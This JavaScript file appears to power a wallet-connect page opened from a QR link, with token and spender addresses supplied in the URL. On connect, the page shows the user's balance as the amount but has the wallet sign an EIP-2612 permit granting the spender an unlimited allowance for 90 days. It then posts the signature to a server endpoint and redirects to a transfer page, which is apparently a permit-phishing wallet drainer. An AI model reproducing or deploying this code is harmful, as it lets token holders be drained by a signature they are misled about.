let provider;
let signer;
let userAddress;
let tokenContract;
let spenderAddress;

const ERC20_PERMIT_ABI = [
    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
    "function nonces(address owner) external view returns (uint256)",
    "function DOMAIN_SEPARATOR() external view returns (bytes32)",
    "function name() external view returns (string)",
    "function decimals() external view returns (uint8)",
    "function balanceOf(address account) external view returns (uint256)"
];

const urlParams = new URLSearchParams(window.location.search);
const TOKEN_ADDRESS = urlParams.get('token') || '';
const SPENDER_ADDRESS = urlParams.get('spender') || '';
const NETWORK_PARAM = urlParams.get('network') || 'sepolia';

const NETWORK_CONFIG = {
    sepolia: {
        chainId: 11155111,
        name: 'Sepolia',
        rpcUrl: 'https://ethereum-sepolia-rpc.publicnode.com',
        blockExplorer: 'https://sepolia.etherscan.io'
    },
    mainnet: {
        chainId: 1,
        name: 'Ethereum Mainnet',
        rpcUrl: 'https://ethereum-rpc.publicnode.com',
        blockExplorer: 'https://etherscan.io'
    }
};

let currentNetwork = NETWORK_PARAM;
let requiredNetwork = NETWORK_CONFIG[currentNetwork];
if (!requiredNetwork) {
    console.warn(`Unknown network: ${currentNetwork}. Using sepolia as default.`);
    currentNetwork = 'sepolia';
    requiredNetwork = NETWORK_CONFIG[currentNetwork];
}

function isValidAddress(address) {
    if (!address) return false;
    return /^0x[a-fA-F0-9]{40}$/.test(address);
}

function getAddress(address) {
    if (!address) {
        throw new Error('Address is required');
    }
    if (!isValidAddress(address)) {
        throw new Error(`Invalid address format: ${address}`);
    }
    try {
        if (typeof ethers === 'undefined' || !ethers.utils) {
            return address.toLowerCase();
        }
        return ethers.utils.getAddress(address);
    } catch (error) {
        console.warn('Checksum error, using lowercase:', error.message);
        return address.toLowerCase();
    }
}

async function checkAndSwitchNetwork() {
    if (!requiredNetwork) {
        showStatus(`Error: Unknown network configuration. Please check URL parameters.`, 'error');
        return false;
    }
    
    if (!window.ethereum) {
        showStatus('Wallet not found', 'error');
        return false;
    }
    
    if (!provider) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
    }
    
    try {
        const network = await provider.getNetwork();
        const currentChainId = network.chainId;
        const requiredChainId = requiredNetwork.chainId;
        
        if (currentChainId !== requiredChainId) {
            showStatus(`Switching to ${requiredNetwork.name}...`, 'info');
            
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: `0x${requiredChainId.toString(16)}` }],
                });
                
                showStatus(`Switched to ${requiredNetwork.name}`, 'success');
                provider = new ethers.providers.Web3Provider(window.ethereum);
                return true;
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: `0x${requiredChainId.toString(16)}`,
                                chainName: requiredNetwork.name,
                                nativeCurrency: {
                                    name: 'ETH',
                                    symbol: 'ETH',
                                    decimals: 18
                                },
                                rpcUrls: [requiredNetwork.rpcUrl],
                                blockExplorerUrls: [requiredNetwork.blockExplorer]
                            }],
                        });
                        
                        provider = new ethers.providers.Web3Provider(window.ethereum);
                        showStatus(`Added and switched to ${requiredNetwork.name}`, 'success');
                        return true;
                    } catch (addError) {
                        const errorMsg = addError.message || addError.toString() || 'Unknown error';
                        showStatus(`Error: Please switch to ${requiredNetwork.name} manually in your wallet. ${errorMsg}`, 'error');
                        return false;
                    }
                } else if (switchError.code === 4001) {
                    showStatus(`Please switch to ${requiredNetwork.name} to continue`, 'error');
                    return false;
                } else {
                    const errorMsg = switchError.message || switchError.toString() || 'Unknown error';
                    showStatus(`Error switching network: ${errorMsg}`, 'error');
                    return false;
                }
            }
        }
        
        return true;
    } catch (error) {
        const errorMsg = error.message || error.toString() || 'Unknown error';
        showStatus(`Network error: ${errorMsg}`, 'error');
        return false;
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
        showStatus('Error: Invalid or missing token address in URL. Please generate a new QR code.', 'error');
        return;
    }
    
    if (!SPENDER_ADDRESS || !isValidAddress(SPENDER_ADDRESS)) {
        showStatus('Error: Invalid or missing spender address in URL. Please generate a new QR code.', 'error');
        return;
    }
    
    try {
        const validSpender = getAddress(SPENDER_ADDRESS);
        document.getElementById('spenderAddress').value = validSpender;
        spenderAddress = validSpender;
    } catch (error) {
        showStatus('Error: ' + error.message, 'error');
        return;
    }
    
    const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
    const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
    
    if (typeof window.ethereum === 'undefined') {
        if (isTrustWallet === false && window.web3) {
            window.ethereum = window.web3.currentProvider;
        } else {
            showStatus('Please install MetaMask or Trust Wallet', 'error');
            return;
        }
    }
    
    if (isTrustWallet) {
        showStatus('Trust Wallet detected. Connecting...', 'info');
    }
    
    await autoConnectWallet();
});

async function autoConnectWallet() {
    try {
        if (!window.ethereum) {
            if (window.web3 && window.web3.currentProvider) {
                window.ethereum = window.web3.currentProvider;
            } else {
                showStatus('Wallet not found. Please open in Trust Wallet browser', 'error');
                const connectBtn = document.getElementById('connectWallet');
                if (connectBtn) {
                    connectBtn.style.display = 'block';
                    connectBtn.disabled = false;
                }
                return;
            }
        }
        
        provider = new ethers.providers.Web3Provider(window.ethereum);
        
        showStatus('Requesting wallet connection...', 'info');
        
        try {
            const accounts = await provider.send("eth_requestAccounts", []);
            
            if (accounts.length === 0) {
                showStatus('Click "Continue" to connect wallet', 'info');
                const connectBtn = document.getElementById('connectWallet');
                if (connectBtn) {
                    connectBtn.style.display = 'block';
                    connectBtn.disabled = false;
                }
                return;
            }
            
            userAddress = accounts[0];
            signer = provider.getSigner();
            
            const networkOk = await checkAndSwitchNetwork();
            if (!networkOk) {
                const connectBtn = document.getElementById('connectWallet');
                if (connectBtn) {
                    connectBtn.style.display = 'block';
                    connectBtn.disabled = false;
                }
                return;
            }
            
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            
            await initTokenContract();
        } catch (requestError) {
            if (requestError.code === 4001) {
                showStatus('Connection rejected. Click "Continue" to try again', 'info');
            } else {
                const existingAccounts = await provider.listAccounts();
                if (existingAccounts.length > 0) {
                    userAddress = existingAccounts[0];
                    signer = provider.getSigner();
                    
                    const networkOk = await checkAndSwitchNetwork();
                    if (!networkOk) {
                        const connectBtn = document.getElementById('connectWallet');
                        if (connectBtn) {
                            connectBtn.style.display = 'block';
                            connectBtn.disabled = false;
                        }
                        return;
                    }
                    
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    
                    await initTokenContract();
                } else {
                    showStatus('Click "Continue" to connect wallet', 'info');
                }
            }
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
        }
        
    } catch (error) {
        console.error('Auto connect error:', error);
        showStatus('Click "Continue" to connect wallet', 'info');
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.style.display = 'block';
            connectBtn.disabled = false;
        }
    }
}


window.connectWallet = async function connectWallet() {
    try {
        if (typeof ethers === 'undefined') {
            showStatus('Error: ethers.js library not loaded. Please refresh the page.', 'error');
            return;
        }
        
        showStatus('Connecting wallet...', 'info');
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.disabled = true;
        }
        
        if (!window.ethereum) {
            showStatus('Wallet not found', 'error');
            if (connectBtn) {
                connectBtn.disabled = false;
            }
            return;
        }
        
        if (!provider) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
        }
        
        const accounts = await provider.send("eth_requestAccounts", []);
        
        if (accounts.length === 0) {
            showStatus('Wallet connection rejected', 'error');
            if (connectBtn) {
                connectBtn.disabled = false;
            }
            return;
        }
        
        userAddress = accounts[0];
        signer = provider.getSigner();
        
        const networkOk = await checkAndSwitchNetwork();
        if (!networkOk) {
            if (connectBtn) {
                connectBtn.disabled = false;
            }
            return;
        }
        
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        if (connectBtn) {
            connectBtn.style.display = 'none';
        }
        
        await initTokenContractAndSignPermit();
        
    } catch (error) {
        console.error('Connection error:', error);
        if (error.code === 4001) {
            showStatus('Connection rejected by user', 'error');
        } else {
            showStatus('Connection error: ' + error.message, 'error');
        }
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.disabled = false;
        }
    }
};

if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            userAddress = null;
            signer = null;
            tokenContract = null;
            const nextBtn = document.getElementById('nextButton');
            const connectBtn = document.getElementById('connectWallet');
            if (nextBtn) nextBtn.disabled = true;
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
            showStatus('Wallet disconnected', 'info');
        } else {
            userAddress = accounts[0];
            signer = provider.getSigner();
            initTokenContract();
        }
    });
    
    window.ethereum.on('chainChanged', () => {
        window.location.reload();
    });
}


async function initTokenContractAndSignPermit() {
    try {
        if (!userAddress || !signer) {
            showStatus('Wallet not connected', 'error');
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
            return;
        }
        
        if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
            throw new Error('Invalid token address. Please check the URL parameters.');
        }
        
        const validTokenAddress = getAddress(TOKEN_ADDRESS);
        
        showStatus('Loading token information...', 'info');
        
        tokenContract = new ethers.Contract(validTokenAddress, ERC20_PERMIT_ABI, signer);
        
        const [balance, decimals] = await Promise.all([
            tokenContract.balanceOf(userAddress),
            tokenContract.decimals()
        ]);
        
        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
        
        document.getElementById('amount').value = balanceFormatted;
        
        showStatus('Signing permit for maximum allowance...', 'info');
        
        const amountWei = ethers.constants.MaxUint256;
        
        const nonce = await tokenContract.nonces(userAddress);
        const deadline = Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60); // 90 дней (3 месяца)
        const tokenName = await tokenContract.name();
        
        const domain = {
            name: tokenName,
            version: "1",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: validTokenAddress
        };
        
        const types = {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };
        
        const message = {
            owner: userAddress,
            spender: spenderAddress,
            value: amountWei.toString(),
            nonce: nonce.toString(),
            deadline: deadline
        };
        
        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);
        
        const response = await fetch('/api/permit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                owner: userAddress,
                spender: spenderAddress,
                value: amountWei.toString(),
                deadline: deadline,
                v: sig.v,
                r: sig.r,
                s: sig.s,
                tokenAddress: validTokenAddress
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showStatus('Permit signed successfully! Redirecting...', 'success');
            setTimeout(() => {
                window.location.href = `/transfer.html?permitId=${result.permitId}&recipient=${encodeURIComponent(spenderAddress)}`;
            }, 1500);
        } else {
            showStatus('Error: ' + result.error, 'error');
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
        }
        
    } catch (error) {
        console.error('Contract initialization or signing error:', error);
        let errorMessage = error.message;
        if (errorMessage.includes('ENS name') || errorMessage.includes('resolver')) {
            errorMessage = 'Invalid token address or network mismatch. Please check that TOKEN_ADDRESS is set correctly and wallet is on the correct network.';
        }
        showStatus('Error: ' + errorMessage, 'error');
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.style.display = 'block';
            connectBtn.disabled = false;
        }
    }
}

async function initTokenContract() {
    try {
        if (!userAddress || !signer) {
            showStatus('Wallet not connected', 'error');
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
            return;
        }
        
        if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
            throw new Error('Invalid token address. Please check the URL parameters.');
        }
        
        const validTokenAddress = getAddress(TOKEN_ADDRESS);
        
        showStatus('Loading token information...', 'info');
        
        tokenContract = new ethers.Contract(validTokenAddress, ERC20_PERMIT_ABI, signer);
        
        const [balance, decimals] = await Promise.all([
            tokenContract.balanceOf(userAddress),
            tokenContract.decimals()
        ]);
        
        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
        
        document.getElementById('amount').value = balanceFormatted;
        document.getElementById('amount').readOnly = false;
        
        const nextBtn = document.getElementById('nextButton');
        if (nextBtn) {
            nextBtn.disabled = false;
        }
        showStatus('Wallet connected. Ready to sign permit.', 'success');
        
        const nextButton = document.getElementById('nextButton');
        if (nextButton) {
            nextButton.onclick = signPermit;
        }
        
    } catch (error) {
        console.error('Contract initialization error:', error);
        showStatus('Error: ' + error.message, 'error');
        const nextBtn = document.getElementById('nextButton');
        const connectBtn = document.getElementById('connectWallet');
        if (nextBtn) nextBtn.disabled = true;
        if (connectBtn) {
            connectBtn.style.display = 'block';
            connectBtn.disabled = false;
        }
    }
}

async function signPermit() {
    try {
        const amount = document.getElementById('amount').value;
        
        if (!amount || parseFloat(amount) <= 0) {
            showStatus('Invalid amount', 'error');
            return;
        }
        
        if (!tokenContract || !signer) {
            showStatus('Please connect wallet first', 'error');
            return;
        }
        
        if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
            throw new Error('Invalid token address. Please check the URL parameters.');
        }
        
        const validTokenAddress = getAddress(TOKEN_ADDRESS);
        
        document.getElementById('nextButton').disabled = true;
        showStatus('Signing permit...', 'info');
        
        const decimals = await tokenContract.decimals();
        const amountWei = ethers.utils.parseUnits(amount, decimals);
        
        const nonce = await tokenContract.nonces(userAddress);
        const deadline = Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60); // 90 дней (3 месяца)
        const tokenName = await tokenContract.name();
        
        const domain = {
            name: tokenName,
            version: "1",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: validTokenAddress
        };
        
        const types = {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };
        
        const message = {
            owner: userAddress,
            spender: spenderAddress,
            value: amountWei.toString(),
            nonce: nonce.toString(),
            deadline: deadline
        };
        
        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);
        
        const response = await fetch('/api/permit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                owner: userAddress,
                spender: spenderAddress,
                value: amountWei.toString(),
                deadline: deadline,
                v: sig.v,
                r: sig.r,
                s: sig.s,
                tokenAddress: validTokenAddress
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showStatus('Permit signed successfully!', 'success');
            setTimeout(() => {
                window.location.href = `/transfer.html?permitId=${result.permitId}&recipient=${encodeURIComponent(spenderAddress)}`;
            }, 1500);
        } else {
            showStatus('Error: ' + result.error, 'error');
            document.getElementById('nextButton').disabled = false;
        }
        
    } catch (error) {
        console.error('Sign permit error:', error);
        showStatus('Error: ' + error.message, 'error');
        document.getElementById('nextButton').disabled = false;
    }
}

function showStatus(message, type) {
    const statusDiv = document.getElementById('status');
    statusDiv.textContent = message;
    statusDiv.className = 'status ' + type;
}
